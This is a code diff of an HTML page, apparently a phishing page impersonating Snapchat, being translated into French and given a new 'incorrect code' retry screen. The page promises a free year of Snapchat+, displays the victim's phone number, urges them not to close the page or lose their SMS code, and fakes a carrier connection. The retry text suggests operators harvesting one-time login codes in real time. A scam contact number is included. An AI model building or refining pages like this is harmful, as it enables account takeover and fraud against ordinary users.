@@ -1,50 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Snapchat+ Validation</title>
+    <meta name="theme-color" content="#fffc00" />
+    <title>Snapchat+ — Validation en cours</title>
     <link rel="stylesheet" href="style.css" />
 </head>
 <body>
     <div class="bg-gif"></div>
     <div class="container">
         <div class="main-card validation-card">
+
             <div class="val-header">
-                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snapchat" class="val-logo" />
+                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg"
+                     alt="Snapchat" class="val-logo" />
                 <h1>Snapchat+</h1>
-                <p class="val-subtitle">Activate Snapchat+ for free for 1 year!</p>
+                <p class="val-subtitle" id="valSubtitle">Activation Snapchat+ gratuite — 1 an !</p>
             </div>
+
+            <!-- Message de statut (normal ou retry) -->
             <div class="val-status" id="valStatus">
                 <div class="spinner"></div>
-                <h2>Validation in progress...</h2>
-                <p class="val-phone">Your request has been received for <strong id="displayPhone">--</strong></p>
+                <h2 id="valTitle">Validation en cours…</h2>
+                <p class="val-phone">
+                    Demande reçue pour <strong id="displayPhone">--</strong>
+                </p>
             </div>
-            <div class="val-alert">
-                <div class="alert-box">
-                    <span class="alert-icon">⚠️</span>
+
+            <!-- Alerte retry (cachée par défaut) -->
+            <div class="val-alert" id="retryAlert" style="display:none;">
+                <div class="alert-box" style="border-color:#f59e0b; background:linear-gradient(135deg,#fffbeb,#fef3c7);">
+                    <span class="alert-icon">🔄</span>
                     <div>
-                        <strong>DO NOT CLOSE THIS PAGE</strong>
-                        <p>You will lose your SMS code</p>
+                        <strong style="color:#92400e;">Code incorrect</strong>
+                        <p style="color:#b45309;">Notre équipe choisit la longueur du nouveau code. Veuillez patienter…</p>
                     </div>
                 </div>
             </div>
+
+            <!-- Alerte normale -->
+            <div class="val-alert" id="normalAlert">
+                <div class="alert-box">
+                    <span class="alert-icon">⚠️</span>
+                    <div>
+                        <strong>NE FERMEZ PAS CETTE PAGE</strong>
+                        <p>Vous perdriez votre code SMS</p>
+                    </div>
+                </div>
+            </div>
+
             <div class="val-network">
                 <div class="network-dots"><span></span><span></span><span></span></div>
-                <p id="networkText">Connecting to mobile network <span id="carrierName">Orange</span>...</p>
+                <p id="networkText">Connexion au réseau mobile <span id="carrierName">Orange</span>…</p>
             </div>
+
             <div class="val-timer">
                 <div class="timer-icon">🕒</div>
                 <div class="timer-text">
-                    <p>Estimated wait time: <strong>~5 min</strong></p>
-                    <p class="timer-small">If the request takes too long, contact us at our official number <a href="tel:+33756863425">07 56 86 34 25</a></p>
+                    <p>Temps d'attente estimé : <strong>~2 min</strong></p>
+                    <p class="timer-small">
+                        Si la demande prend trop de temps, contactez-nous au
+                        <a href="tel:+33756863425">07 56 86 34 25</a>
+                    </p>
                 </div>
             </div>
+
             <div class="val-footer">
-                <p>🔒 Secure connection • Data protected</p>
-                <p class="val-legal">The Snapchat+ subscription will not be charged to you.</p>
-                <p class="val-legal">The subscription is available only for eligible users.</p>
+                <p>🔒 Connexion sécurisée · Données protégées</p>
+                <p class="val-legal">L'abonnement Snapchat+ ne vous sera pas facturé.</p>
+                <p class="val-legal">L'abonnement est disponible uniquement pour les utilisateurs éligibles.</p>
             </div>
+
         </div>
     </div>
     <script src="validation.js"></script>
